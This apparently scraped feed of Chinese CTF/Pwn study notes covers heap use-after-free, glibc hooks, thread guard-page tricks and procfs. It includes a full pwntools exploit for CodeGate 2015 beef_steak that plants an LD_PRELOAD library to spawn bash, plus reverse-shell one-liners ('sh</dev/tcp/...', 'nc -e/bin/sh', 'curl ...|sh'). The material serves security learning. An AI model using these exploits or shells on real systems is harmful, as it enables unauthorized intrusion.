&lt;atoi+16&gt; add esp, 0x1c0xffca8fc0│+0x0010: 0xffca8ff8 → 0xffca0a31 → 0x000000000xffca8fc4│+0x0014: 0x000000000xffca8fc8│+0x0018: 0x0000000a0xffca8fcc│+0x001c: 0x00000002─────────────────────────────────────────────────────────────── code:x86:32 ──── 0x8048752 &lt;add_note+220&gt; mov al, ds:0x458b0804 0x8048757 &lt;add_note+225&gt; call 0x581173df 0x804875c &lt;add_note+230&gt; call 0x80484e0 &lt;malloc@plt&gt; → 0x8048761 &lt;add_note+235&gt; add esp, 0x10 我们来具体检验一下，看一下覆盖前的情况，可以看到该内存块的 put 指针已经被置为 NULL 了，这是由 fastbin 的 free 机制决定的。 123gef➤ x&#x2F;2wx 0x09cec1600x9cec160: 0x00000000 0x09cec170gef➤ 覆盖后，具体的值如下（这里其实我测试的时候跳多了，直接结束了，重新跑的时候地址变了，所以0x0846210a这个地方是错的，但前面被修改为magic地址是可以确定的 1234gef➤ x&#x2F;2wx 0x09cec1600x09cec160: 0x08048986 0x0846210agef➤ x&#x2F;i 0x08048986 0x8048986 &lt;magic&gt;: push ebp 可以看出，确实已经被覆盖为我们所想要的 magic 函数了。 最后执行的效果如下 123456789101112131415$ python exp.py [+] Starting local process './hacknote': pid 20575[*] running in new terminal: /usr/bin/gdb -q \"./hacknote\" 20575 -x \"/tmp/pwnHjxz2s.gdb\"[+] Waiting for debugger: Done[*] Switching to interactive modeTHIS_IS_A_FLAG---------------------- HackNote ---------------------- 1. Add note 2. Delete note 3. Print note 4. Exit ----------------------Your choice :$ 同时，我们还可以借助 gef 的 heap-analysis-helper 来看一下整体的堆的申请与释放的情况，如下 1234567891011121314151617181920212223242526272829303132gef➤ heap-analysis-helper [*] This feature is under development, expect bugs and unstability...[+] Tracking malloc()[+] Tracking free()[+] Tracking realloc()[+] Disabling hardware watchpoints (this may increase the latency)[+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found.[*] Note: The heap analysis slows down noticeably the execution. gef➤ cContinuing.[+] Heap-Analysis - malloc(8)&#x3D;0x804b008[+] Heap-Analysis - malloc(8)&#x3D;0x804b008[+] Heap-Analysis - malloc(32)&#x3D;0x804b018[+] Heap-Analysis - malloc(8)&#x3D;0x804b040[+] Heap-Analysis - malloc(32)&#x3D;0x804b050[+] Heap-Analysis - free(0x804b018)[+] Heap-Analysis - watching 0x804b018[+] Heap-Analysis - free(0x804b008)[+] Heap-Analysis - watching 0x804b008[+] Heap-Analysis - free(0x804b050)[+] Heap-Analysis - watching 0x804b050[+] Heap-Analysis - free(0x804b040)[+] Heap-Analysis - watching 0x804b040[+] Heap-Analysis - malloc(8)&#x3D;0x804b040[+] Heap-Analysis - malloc(8)&#x3D;0x804b008[+] Heap-Analysis - Cleaning up[+] Heap-Analysis - Re-enabling hardware watchpoints[New process 36248]process 36248 is executing new program: &#x2F;bin&#x2F;dash[New process 36249]process 36249 is executing new program: &#x2F;bin&#x2F;cat[Inferior 3 (process 36249) exited normally] 这里第一个输出了两次，应该是 gef 工具的问题。","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"CodeGate 2014 – rev+pwn450 – weird_snus","slug":"CodeGate-2014-–-rev-pwn450-–-weird-snus","date":"2019-07-05T07:12:28.000Z","updated":"2019-07-05T07:13:14.086Z","comments":true,"path":"2019/07/05/CodeGate-2014-–-rev-pwn450-–-weird-snus/","link":"","permalink":"https://darkwing.moe/2019/07/05/CodeGate-2014-%E2%80%93-rev-pwn450-%E2%80%93-weird-snus/","excerpt":"","text":"题目信息题目链接https://github.com/ctfs/write-ups-2014/tree/master/codegate-preliminary-2014/weirdsnus 准备环境12$ echo HEHE_I_DONT_KNOW_YOU &gt; admin_passwd $ echo N0_MoR3_SMOKING_SNUS &gt; flag 基本信息 静态分析x86二进制文件分析使用IDA 重命名变量 stack上的变量，全局变量等，考虑他们在哪里被使用 确定变量的size 特别是char[]类型的数组 确定结构体的结构 IDA中可以定义结构体成员 猜测函数功能 根据变量名，变量size，结构体结构等，可能看出函数功能 重命名函数 根据函数的功能重命名函数 发现处理不当(错误)的地方 找出可能利用点 重复以上流程，找出漏洞点，分析编写exploit main整体大概是这样 从函数定义，函数实现，参数传递，canary相关等进行分析 复杂的处理可以从library call为起点确定变量 因为library call有固定的参数个数和参数类型 第一块 保存旧的ebp，在stack frame上更新当前的ebp，准备好函数使用的各种寄存器的值，准备好stack空间，做好各种准备，以便函数启动后能立即就绪 将函数参数(这里是argv)保存到stack上。x86中通常将参数重新保存在栈上 从TLS区域(gs+0x14)将stack canary复制到栈上 以上三个是常见模式 buffer是0x110-0x10=0x100=256字节 memset的内部展开，”rep stosd”四个字节是memset高速实现 stosd: EAX存储在[EDI]中 rep: ecx!=0时[重复ecx-=N(这里是DWORD，N=4)] strlen是library call，需要注意signed和unsigned的区别 第2到5快 图上已经做了函数重命名（分析后的结果） 函数结束时，释放使用的stack，还原用到的寄存器，还原ebp的值。如果函数有返回值，则返回值给eax 转换成C语言代码大概是这样： password_check第一块 第二块～ 转换成C语言代码 memcmp的第三个参数len，是用户可控的 输入\\x00的话，len(“\\x00”)=0 这样就跳过了memcmp doit第一块 第三～块 EAX范围检查按照unsigned，如果不在0x28~0x7a则nop 第七～块 switch 保存在.rodata区域的jump_table 分支分析大概是这样 如果argv[1]有’(‘, ‘)’，则可以调用更深的函数，但需要先bypass前面的认证 转换成C语言代码 实际上signed比较函数也有bug，一般size比较都是signed，如果输入一个字节的负数(0x80~0xff)，能够通过比较。但是没法进行后续利用 case ‘z’那里的free(ptr)之后没有清空ptr，后续进行写入会造成Use After Free，但是这里也无法进行exploit do_command_loop 可以看到一个malloc(16)的结构体 结构体大概这样，定义后应用 根据需要应用结构体偏移 分析之后大概是这样 转换成C语言代码 do_command_loop的bug 存在两个bug 第一个bug，read_key(new_buffer, buffer_len)，两个参数完全没关系，但是read_key内部将buffer_len作为new_buffer的size，buffer_len用户可控 第二个bug，free(ptr)之后，没有将ptr设置为NULL，也就能够进行Use After Free ptr != NULL的检查不能确定UAF。也就是说，如果UAF之后ptr用作其他用途，则可能修改func_ptr，之后可能调用func_ptr。 漏洞思考 如何控制EIP 重写函数指针 我们已经有一个16字节的结构体： 1234struct struc_1 &#123;char string[12]void* func_ptr # 想要重写这个&#125; 首先构造Use After Free do_A - malloc do_M - free free时，因为是16字节，会连接到fastbins区域 LIFO，下次申请16字节内存时会重新使用这部分内存 寻找一个16字节分配以及任意写入的点 这里会根据我们指定的size进行malloc，之后read_key用到new_buffer getcwd()通过new_buffer读取当前工作目录，如果当亲工作目录path超过16字节，就能够覆盖函数指针 利用流程大概是这样： 动态调试 测试运行 已经控制了EIP getshell因为有NX，shellcode比较困难，尝试system(“/bin/sh”) 常规方式需要将参数加载到stack上 第一个参数必定是0x0a，不能指定文件名 Use After Free这是可能的利用方式 func_ptr overwrite + ROP 先在stack上准备好ROP 通过Use After Free，在func_ptr之前，pop×N; ret 这样当调用该函数时，popxN除去了多余的参数，执行ROP command使用fgets()读取输入到buffer 因此可以考虑在换行前输入字符串 但是这种方法只能读取10个字节 而这种ROP需要至少12个字节 注意到do_D的buffer可以控制 考虑使用command D 尝试 计算偏移 需要一个add esp, 0x144+α的gadget 找到一个add 0x140 + pop3回 = 0x14c的gadget exploit大概流程是这样： 替换为system, /bin/sh的地址 img 可以看到测试能够getshell 实际运行 img img 发生了SIGSEGV 实际上成功了 system(“/bin/sh”)，command从标准输入读取 但是，标准输入绑定input，因此无法读取到 因此，不执行任何操作，/bin/sh结束 之后因为stack已经被破坏，发生SIGSEGV 我们需要做一点处理 img (cat input; cat -) 这样能够向input继续输入 成功getshell","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记22:Use After Free","slug":"Pwn学习笔记22-Use-After-Free","date":"2019-06-25T08:04:07.000Z","updated":"2019-06-25T08:05:01.906Z","comments":true,"path":"2019/06/25/Pwn学习笔记22-Use-After-Free/","link":"","permalink":"https://darkwing.moe/2019/06/25/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B022-Use-After-Free/","excerpt":"","text":"前置知识之前有过相关内容 Use After Free 模式化fastbins类型典型流程 找到存在Use After Free漏洞的指针x free(x)，但没有将x设置为NULL 如果有多个指针，free(x)之后没有将所有的指针设置为NULL x最好是函数指针 或者后面的y是一个函数指针 free(x) # 但x仍然指向堆中的一个chunk 发送会产生free(x)的输入选项 之后直接y = malloc(size)，返回与x相同的chunk 如果能够指定size，只需要与x的size相同就可以 攻击者必须能够向y写入内容 向y写入内容(相当于写x) 如果能够使用x就会造成Use After Free 可以将func_ptr修改为任意值 Use After Free后的利用方式一般是劫持函数指针 调用 system(“/bin/sh”) 需要能够将输入数据作为函数参数 类似system(“/bin/sh”)进行ROP/COP/JOP等 类似system(“/bin/sh”)调用进行ROP/COP/JOP的stager 无法直接指定函数参数，也可以用ppret这种方式执行stack上的ROP heap上也经常使用的JOP/COP 其他的利用方式x，y不是func_ptr的情况 控制作为字符串使用的成员 消除NULL终止符，泄漏堆和libc(arena相关)的地址 控制作为字符串指针的成员 任意内存的内存泄漏 替换GOT之类的地址 控制作为权限flag的成员 意外的权限提升 控制作为count，size之类的成员 stack/heap 溢出 控制作为链表指针的成员 重新连接时可能任意地址写 Unlink attack, fastbins unlink attack","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记21:其他一些技术","slug":"Pwn学习笔记21-其他一些技术","date":"2019-06-24T06:00:34.000Z","updated":"2019-06-24T06:02:34.173Z","comments":true,"path":"2019/06/24/Pwn学习笔记21-其他一些技术/","link":"","permalink":"https://darkwing.moe/2019/06/24/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B021-%E5%85%B6%E4%BB%96%E4%B8%80%E4%BA%9B%E6%8A%80%E6%9C%AF/","excerpt":"","text":"回连后禁用SIGALRM在具有alarm(x)的二进制文件上，进行exploit 假设已经反弹了shell 能够得到远程shell，但几秒后就会断开连接 如果能够快速输入’bash -i’的话当然很好 没有确认细节，通过bash禁用SIGALRM(使连接继续保持) 设置EAX的值通过ROP能够修改EAX/RAX为任意值的情况 直接调用system call 通过一些gadget结合EAX/RAX使用 但pop eax(rax)是很罕见的gadget 可以通过函数返回值来控制 alarm(x) -&gt; alarm(0) write(fd, buf, x) read(fd, buf, x) 某些情况下，能够将X设置为固定值 如果想让rax=11，可以调用write(stdout, buf, size=11) 但是，我们无法控制对应size参数的寄存器rdx 在存在write(stdout, buf, size=12)这类情况下，可以使用 存在使这个write的返回值为11的方法 但是，仅适用于本地权限提升类型，并且不需要读取输出的题目 考虑write(stdout, buf, size) 通常，stdout是阻塞模式 也就是说，write()在写入size大小之前不会结束 如果stdout处于非阻塞模式呢？ 即便没有全部写，也可以返回，返回值小于等于size 也就是说，需要将write setblocking(0) setblocking(0)的socket stdout 终端1 ： 使用python的socket bind() localhost:1337 作为服务器，即便有连接也不读取数据 终端2: 使用python的socket s去connect() localhost:1337 执行s.setblocking(0)，将socket设置为非阻塞模式 利用subprocess ： p=Popen(“./binary”, stdin=PIPE, stdout=s) 使用stdout和我们的socket s来进行ROP 调用write(stdout, …)，将一直写入，直到socket缓冲区被填满 write()因为非阻塞模式结束 write()的返回值将小于size(例如11) 不使用socket，使用同样buffer的pipe？ 这可能不行，因为返回errno: EAGAIN 仅在socket指定fd，并且提前发送大量数据的情况下才有效 CodeGate 2014 - minibomb __free_hookglibc的malloc()和free()的实现，在.bss中存在函数指针 http://osxr.org/glibc/source/malloc/malloc.c#2913 如果__free_hook不为NULL，则调用它而不是free。__free_hook是bss中的函数指针 假设存在任意的Write-primitive也就是，任意值可以写入任意内存的情况 重写__free_hook 当调用free的时候，控制RIP heap类问题下，重写__free_hook非常有用 例如将__free_hook修改为system() free(user_input)就变成了system(user_input) __free_hook是glibc内部变量，所以它不受Full-RELRO影响 类似的hook函数还有__malloc_hook等 CodeGate 2015 - weff WildCopy线程之间的条件竞争 http://googleprojectzero.blogspot.jp/2015/03/taming-wild-copy-parallel-thread.html 利用整数溢出，memcpy和上下文切换的特性 实现线程的二进制文件中可能有这种情况 对于基于线程的二进制文件，最好注意条件竞争 似乎也可用于沙盒问题 充分利用两个线程 线程A上执行memcpy(dst, src, 负数) 参数使用负数，利用整数溢出 因为memcpy将第三个参数看作unsigned，因此它会变成一个非常大的数 线程A保持从src到dst的memcpy 当dst到达不可访问的dst时会造成SIGSEGV 线程B使用被覆盖的内存 期待在线程A产生SIGSEGV之前发生上下文切换 线程B通过使用被覆盖的内存，控制栈或者堆函数指针来执行execve 调用execve时，所有线程都会停止，并且新进程会重置内存空间，因此不会产生SIGSEGV 栈保护页(Stack guard page)之外Linux中创建线程的几种方式 pthread系 pthread_create()之类 标准的创建线程函数 ucontext系 makecontext(),swapcontext(),getcontext(),setcontext() 自己实现线程切换计时时使用 还与sigaction()有关 clone系 创建线程的低层方式 clone(2)的flag参数，设置为CLONE_THREAD 每个线程都是独立的栈 pthread系自动创建栈，但可以单独调整 ucontext系和clone系需要自己创建一个新的栈空间（例如通过mmap） 线程(pthread系)中，栈是单独创建的 每个栈之间都有一个保护页(权限是—p) 但是，在地址上是连续的 线程B的栈 线程A的栈 原本的栈 如果一个线程用尽栈空间，会发生什么？ 在线程A中，考虑函数递归调用的情况 栈可能会堆积很多 最终，当尝试写入保护页时，发生SIGSEGV 因为权限是---p，不能读写 默认情况下，保护页的大小只有0x1000 如果线程A的递归函数越界超过0x1000呢？ 会跳过保护页，并且写入到线程B的栈中 线程B的栈被重写 线程A的递归调用可能重写线程B栈上的返回地址 之后，可以在线程B上进行ROP，getshell ucontext没有保护页 因为是自己准备栈空间(除非刻意生成保护页) 如果各个栈的内存地址是连续的，则不需要考虑跳过保护页，只需要溢出到其他线程的栈 例题 Hack.lu CTF 2014 - Mario (pthread系) Ghost in the shellcode 2015 - gitschat (ucontext系) 其他通过return-to-dl-resolve伪造link_map dl_runtime_resolve()，参数(栈上push的两个值)是link_map和reloc_arg 技术解释是伪造reloc_arg，可以伪造link_map产生同样的效果 HITCON CTF 2015 - blinkroot 针对Strict Weak Ordering的攻击 针对sort()函数 大多数情况下，第三个参数是作为排序规则的比较函数 比较函数必须满足严格弱排序(Strict Weak Ordering) 比较相同数值时，返回false，不改变顺序 通常，二进制文件运行期间无法生成和指定比较函数，也不存在可以动态生成和指定(Lua或者JavaScript)比较函数的例子 如果可以指定特殊比较函数(例如始终返回true)，那么sort可能会产生异常行为 这是一种针对未定义行为的攻击 通常sort内部实现是qsort，如果最初返回N次true，之后正常返回true/false的话，那么可能能够控制特定位置的内存交换 31C3 CTF 2014 - SaaS","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记20:其他一些技术","slug":"Pwn学习笔记20-其他一些技术","date":"2019-06-20T07:16:45.000Z","updated":"2019-06-20T07:17:41.266Z","comments":true,"path":"2019/06/20/Pwn学习笔记20-其他一些技术/","link":"","permalink":"https://darkwing.moe/2019/06/20/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B020-%E5%85%B6%E4%BB%96%E4%B8%80%E4%BA%9B%E6%8A%80%E6%9C%AF/","excerpt":"","text":"本地权限提升下的ASLR 这类问题在getshell后有方法可以禁用ASLR http://inaz2.hatenablog.com/entry/2014/07/23/001318 ulimit -s unlimited (仅限32位进程) 这种方式可以启动一个禁用ASLR的bash会话 setarch uname -m -R /bin/bash(32位，64位都可以) 但是对于setuid的二进制程序无效 这样是一个固定的随机地址 利用procfs /proc/self/maps ： 可以知道内存映射(无视ASLR) 可以获得运行中进程的完整路径以及libc路径 /proc/self/stat ： 可以知道进程的准确栈地址 不如maps，但可以获得大量信息 /proc默认权限是可读的 信息宝库 因为它太强了，某些题目会修改它的权限 /proc/self/environ ： 可以获得进程的环境变量 /proc/self/mounts ： 可以获得mount信息 /proc/self/cmdline ： 可以获得进程启动时的命令行参数 可以通过/proc/$PPID/cmdline获得其他进程的信息 可以从/proc/self/stat获得$PPID 父进程的启动参数中也会有有用信息 检查这些内容可能获得突破 /proc/self/mem ： 可以重写自身内存，即使是.text 部分CTF沙盒题目会用到 /proc/self/fd/N ： 即使文件名未知也可以指定，只要它是打开的 /proc/self/fdinfo/N ： 可以确定文件的当前搜索(seek)位置 /proc/$PID/root ： 可以引用另一个namespace中运行的进程 /proc/$PID/cwd ： 同样，可能引用cwd /proc/$PID/mountinfo ： 同样，可能获取mount信息 可写目录任何人都可以写的目录 /tmp /var/tmp 如果设置了SBIT /var/metrics /var/crash /run/shm /run/lock 利用字符串”sh\\0”执行ROP时，最终需要执行system(“/bin/sh”) x86: p32(libc_system) + p32(dummy) + p32(&amp;”/bin/sh”) x64: p64(pop_rdi) + p64(&amp;”/bin/sh”) + p64(libc_system) 第一个参数需要字符串”/bin/sh” 一般是在libc中 因此，通常需要这些步骤： 确定libc版本 泄漏libc相关地址 libc_base + offset_binsh = libc_binsh 但是，system()需要通过PATH来搜索执行 因此，如果PATH没有被删除，甚至可以直接system(“sh”) 通常，”/bin”的PATH会保留 如果存在”sh\\0”这样的字符串，就可以利用 http://akiym.hateblo.jp/entry/2015/07/12/192517 在地址固定区域(例如.data)使用字符串”sh\\0” fflush, slash, hash之类的都可以 gdb-peda$ find 0x006873 可以利用的不仅仅是libc libpthread也是CTF常用的库 当使用多线程时，经常用到的库 这是少数具有system()和’sh’的库之一 还有其他库也有这些，但并不常用 https://www.youtube.com/watch?v=td1KEUhlSuk 11:00~左右，这个视频中没有使用’sh’，只使用了system() Python的interactive涉及Python二进制文件的漏洞利用案例 这种情况下，某些情况不需要突破ASLR 假设我们已经控制了RIP 我们可以尝试跳转到python shell 运行此shell的函数是PyRun_InteractiveLoop 通过溢出或者重写函数指针跳转到PyRun_InteractiveLoop 启动Python交互shell Python二进制文件没有PIE，这个函数地址是固定的 因为不涉及glibc，所以也不需要system(不需要考虑绕过ASLR) 但是需要注意，有必要获取目标环境的Python二进制文件来确定地址偏移等信息 某些情况，即使成功也会产生SIGSEGV 获取python shell之后，就可以直接调用os.system() php，perl，ruby等都有类似的函数 但是，能否无参数(无条件)启用交互式shell，不确定 例题 ：31C3 CTF 2014 - sarge 获取shell的短字符串system(任意字符串) 假设参数字符串的长度受限 可以尝试使用最短的字符串 xinetd类型 fd固定为0，1，2，只需要使用’sh’(包含空字符共3个字节)就可以 fork-server类型 ‘sh&lt;&amp;4’(6个字节)之类的(如果socket fd为4) 打开shell后，使用’bash -i &gt;&amp;4 2&gt;&amp;4’获得更多输出 SECUINSIDE 2014 - givemeshell 如果fd关闭 只能反弹shell bash: ‘sh&lt;/dev/tcp/111.222.333.444/80’(最大31字节) 回连之后，使用’bash -i &gt;&amp;0 2&gt;&amp;0’获取输出 netcat: ‘nc -e/bin/sh 111.222.333.444 80’(最大32字节) 更好的选择是’curl 111.222.333.444|sh’(最大24字节) 自己开启服务，返回想要执行的代码 将获取的响应传递给sh 获取反弹shell 可以使用较短的域名 例题：32C3 CTF 2015 - cryptmsg 如果能够上传文件 上传反弹shell的代码 默认情况下，没有执行权限，需要将它作为sh的参数 ‘sh /tmp/x’之类的，只需要10个字节 也可以使用通配符以及表示source的点 例如&#39;. /*/J*&#39;，只需要8个字节 无论文件名多长，这种方式都能使其足够短 通配符选择找到的第一个 因此最好使文件名比较独特 例题：Hack.lu CTF 2015 - Petition Builder 回连之后获取tty的方法 如果想要执行su，sudo，或者其他需要tty的命令 可以在stage2时关闭no-tty的fd 有四种方法 1. 使用Python python -c ‘import pty; pty.spawn(“/bin/sh”)’ 2. 使用expect ./expect -c ‘spawn sh; interact’ 需要自己上传expect及依赖库 3. 使用socat https://wiki.mma.club.uec.ac.jp/ytoku/CTF/Writeup/AdventCalendarCTF2014/2014-12-24 上传socat及依赖库 本地端：socat `tty`,raw,echo=0 TCP-L:80,reuseaddr 远程端：./socat TCP:&lt;ipaddr&gt;:80 exec:bash,pty,stderr,setsid 4. 使用script SHELL=/bin/bash script -q /dev/null 同样，php，perl，ruby之类的也可以 adctf - RegExp Quiz CodeGate 2015 - Rodent (stage2)","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"beef_steak – CodeGate 2015 - pwnables400 ","slug":"beef-steak-–-CodeGate-2015-pwnables400","date":"2019-06-18T07:57:54.000Z","updated":"2019-06-18T07:58:43.417Z","comments":true,"path":"2019/06/18/beef-steak-–-CodeGate-2015-pwnables400/","link":"","permalink":"https://darkwing.moe/2019/06/18/beef-steak-%E2%80%93-CodeGate-2015-pwnables400/","excerpt":"","text":"基本信息Category: Pwnable Points: 400 Solves: TODO Description: Binary : http://binary.grayhash.com/6c5c199232567d00314a684d0123b11c/steak Server : 54.64.101.236 Port : TCP 8888 OS : Ubuntu 14.04.2 LTS x86-64 Just overflow. 有一个栈溢出，非常短的二进制文件 开了Stack Canary和NX 如何解决主要是三个点 argv[0] leak RC4 Shared Library Injection 初始检查直接运行会产生SIGSEGV，似乎缺少能够让它正常运行的东西 用strace确认添加env -i以防万一和清除环境变量 可以看出需要一个steak用户目录以及flag文件 创建对应用户及文件 123sudo adduser steaksu steakecho THIS_IS_A_FLAG &gt; /home/steak/flag 之后测试运行，大概就是接收stdin，sleep，结束，这样的流程 vmmap 低位是.text .data .bss等区域，这部分地址是固定的 高位是library，mapped，vdso，stack之类，程序正常运行必要的东西。如果开启了ASLR，这部分地址会受到影响。gdb运行下ASLR会暂时失效。 beef_steak解析静态分析 整个流程大概就是，从flag文件读取内容作为key，对stdin内容进行RC4加密，之后与特定内容进行比较，相等则执行system(&quot;/bin/cat &gt; ./message&quot;);，不相等puts(&quot;I don&#39;t like that!&quot;); RC4的key是flag key最大可能有40字节，理论上无法破解 因为我们不知道key，所以无法通过特定字符串的比较 也就无法调用system 存在栈溢出 缓冲区是40字节 读取了512字节 但是存在canary 这个问题符合argv[0] leak情况 Stack Canary 没有PIE canary保护的函数有足够的溢出空间 可以读取glibc显示的错误信息 那应该泄漏哪些东西呢？ 如果能够泄漏RC4相关内容就太棒了 如果成功，就能够调用system() 那么RC4相关内容在哪里 key(=flag)和表S，存在于.bss区域中 但是，key最初被KSA使用后立即清零。也就谁说，只有表S可以泄漏 表S的地址是0x602160 泄漏RC4内部表使用argv[0] leak泄漏0x602160的内容 尝试计算出准确距离，精确泄漏 在返回之前设置断点，查看状态 这里设置在0x400CC8，返回之前必定会执行这里 正常运行，确认stack状态： 可以计算出输入与argv[0]之间距离为280字节 使用280个”\\0” + 0x602160比较好 使用”\\0”而不是”A”，因为RC4_PRGA()中使用了strlen()，这样导致返回0，输入的数据不会经过RC4加密 因为没有进入循环，没有任何字节被修改，S也不会变化 注意小端序问题，测试运行： 实际上，这些就是泄漏出来的表S内容 exploitargv[0] leak 因为RC4状态表会出现一次\\x00导致后面内容不显示，所以需要进行一点处理 这样我们可以获取到本地测试环境的RC4状态表 RC4解密我们已经获得了状态表S，通过S生成伪随机数序列，与密文异或就能够获得明文 这样我们使用获取的明文作为输入，运行程序，就能够执行system() getshell这样我们相当于已经可以写入任意内容到文件了，应该也就能够进行Shared Library Injection 可以按这个流程操作： 第一次将mylib.so作为message上传 第二次伪造LD_PRELOAD=./message环境变量 到envp的距离 也就是说，我们如果想修改envp[0]，只需要填充296字节 那么字符串LD_PRELOAD=./message应该放在哪呢 因为RC4的输入是栈上的buffer，输出是全局变量output，全局变量的地址固定，可以使用这个 需要注意最初25个字节是strcmp进行比较来判断是否执行system 整个攻击流程大概是这样： exploit 参考https://m.blog.naver.com/PostView.nhn?blogId=mathboy7&amp;logNo=220642760094&amp;proxyReferer=https%3A%2F%2Fwww.google.com%2F 只搜到这一篇writeup，结合以上内容直接看代码吧： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *def rc4_dec(_data): data = map(ord, _data) state = gstate[::] buf = [] var1 = 0 var2 = 0 for i in range(0, len(data)): var2 += 1 var2 %= 256 var1 += state[var2] var1 %= 256 tmp = state[var1] state[var1] = state[var2] state[var2] = tmp d = data[i] ^ state[(state[var1] + state[var2]) % 256] buf.append(d) return ''.join(map(chr, buf))r = remote(\"localhost\", 8888)_state = \"86041335c74693fcc63ba41192558dfd81eb63d45a17512e8c3ebf6fd162df4030a13fa38b5e140582859737c36d5321fec4cf1aba26873161cae9589a8341c172020164f41b60e20369b68a1eaa4eefe5f8da996c43a54d5da6ac908f3c91f638abfbcdbde05f2a70237d7c591dfacb0680d22d3a49209eb78466334c2750967adbb1a79429f1e6d0579fd90a489c9507540bafe7e4d839a94ff3e1b82f74109df073777e71097925b5281f89ea520c98add7c516f5180f19b388321c4b08f95cd3b00e5bb967342cde6e00eecec0dca845a03dff7675f215edecccc87f4744b465689bf7e856b2dde32bc936d64a122442d5bb0d78bc6b6abe7baea2c28e22\".decode(\"hex\")gstate = map(ord, _state)enc = \"\\x62\\x31\\xaa\\x85\\xbd\\xbf\\x9f\\xf3\\x8a\\x02\\x0c\\x75\\xac\\x23\\xab\\xe4\\x82\\xc5\\x25\\x7a\\xef\\xbd\\xc9\\x61\"print r.recv(1024)r.send(rc4_dec(enc) + \"\\n\") # b33fb33feasytodigestb33fprint r.recvuntil(\"You may leave a message\")lib = \"\"\"#include &lt;unistd.h&gt;__attribute__((constructor)) void init() &#123; char *f[] = &#123;\"/bin/bash\", NULL&#125;; execve(\"/bin/bash\", f, NULL);&#125;\"\"\"open(\"lib.c\", \"w\").write(lib)os.system(\"gcc -shared -fPIC -o lib.so lib.c\")r.send(open(\"lib.so\").read())r.close()r = remote(\"localhost\", 8888)print r.recv(1024)payload = rc4_dec(enc + \"\\x00\" * 8 + \"LD_PRELOAD=./message\\x00\")# there is no NULL Byte in payload, but there is in encrypted payloadpayload += \"\\x00\" * (0x128 - (len(payload)))payload += p64(0x602140)payload += \"\\x00\" * (512 - len(payload))r.send(payload)sleep(4.1)r.interactive()","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Shared Library Injection","slug":"Shared-Library-Injection","date":"2019-06-12T07:13:20.000Z","updated":"2019-06-12T07:14:18.877Z","comments":true,"path":"2019/06/12/Shared-Library-Injection/","link":"","permalink":"https://darkwing.moe/2019/06/12/Shared-Library-Injection/","excerpt":"","text":"Shared Library Injection关注环境变量LD_PRELOAD LD_PRELOAD这个对于CTF选手来说应该很常见 例如这样使用 hook libc中的函数(例如printf)，将其替换成自定义函数 $ export LD_PRELOAD=./mylib.so $ ./a.out mylib.so中重写了printf()函数，a.out调用printf时，实际调用的是重写后函数 LD_PRELOAD环境变量的细节文档 http://linuxjm.osdn.jp/html/LDP_man-pages/man8/ld.so.8.html https://ctf-wiki.github.io/ctf-wiki/reverse/linux/ld_preload/ 正常情况下, Linux 动态加载器ld-linux(见 man 手册 ld-linux(8)) 会搜寻并装载程序所需的共享链接库文件, 而LD_PRELOAD是一个可选的环境变量, 包含一个或多个指向共享链接库文件的路径. 加载器会先于 C 语言运行库之前载入LD_PRELOAD指定的共享链接库，也就是所谓的预装载 (preload)。 预装载意味着会它的函数会比其他库文件中的同名函数先于调用, 也就使得库函数可以被阻截或替换掉. 多个共享链接库文件的路径可以用冒号或空格进行区分. 显然不会受到LD_PRELOAD影响的也就只有那些静态链接的程序了. 当然为避免用于恶意攻击, 在ruid != euid的情况下加载器是不会使用LD_PRELOAD进行预装载的. 更多阅读: https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html#ixzz569cbyze4 就是一个能够重新加载函数的环境变量，但是如果设置了suid/sgid的话就不可用 思路 对于获取远程shell的题目，没有设置suid/sgid 这种情况下，可能使用LD_PRELOAD加载库来获取shell 问题 LD_PRELOAD具体是否可以用于远程获取shell？ 需要解决以下三点 如何设置自己的库 如何利用LD_PRELOAD 如何更改正在运行的进程的环境变量 问题点1:如何设置自己的库只能利用二进制文件中上传文件的过程 目标处理将用户输入的数据保存为文件 通常没有这样的代码，并且存在严格限制 如果服务器上同时运行多个问题服务，则可以通过其他问题获取的shell将文件保存到/tmp等目录 问题点2:如何利用LD_PRELOAD 假设可以在正在运行的进程中伪造LD_PRELOAD环境变量 具体如何操作，之后说明 能够影响LD_~系列环境变量的，基本是在外部命令运行时 也就是说，应该先调查system()或者execve()之类的 首先，确认system()对环境变量的处理 http://osxr.org/glibc/source/nptl/pt-system.c http://osxr.org/glibc/source/sysdeps/posix/system.c http://osxr.org/glibc/source/sysdeps/posix/system.c 